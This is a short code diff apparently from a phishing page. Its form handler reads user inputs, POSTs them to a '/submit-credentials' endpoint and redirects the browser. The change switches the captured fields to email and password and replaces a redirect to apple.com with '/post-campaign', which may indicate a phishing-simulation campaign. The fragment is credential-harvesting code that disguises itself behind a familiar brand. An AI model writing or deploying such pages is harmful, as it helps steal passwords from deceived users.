@@ -41,10 +41,12 @@
       const address = document.querySelector('input[name="address"]').value;
       fetch("/submit-credentials", {
         method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ name, email, address })
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ email, password })
       }).finally(() => {
-        window.location.href = "https://apple.com";
+        window.location.href = "/post-campaign";
       });
     }
   </script>
